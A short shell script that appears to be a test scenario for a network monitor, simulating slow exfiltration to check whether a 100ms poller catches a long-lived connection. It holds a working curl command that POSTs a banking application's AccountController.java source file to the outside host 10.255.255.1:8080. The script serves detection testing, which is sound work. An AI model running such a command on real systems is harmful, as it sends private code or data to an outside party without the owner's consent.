#!/bin/sh
# Scenario 6 — slow exfiltration
# Opens a long-lived TCP connection to an external host and trickles data
# slowly over it. Tests whether the 100ms network poller catches a
# connection that stays open rather than a short burst.
echo "[attack] opening slow exfil channel to 10.255.255.1:8080"
curl -m 8 -X POST --data-binary @src/main/java/com/pipejack/banking/controller/AccountController.java http://10.255.255.1:8080/drip || true
echo "[attack] slow exfil attempt finished"
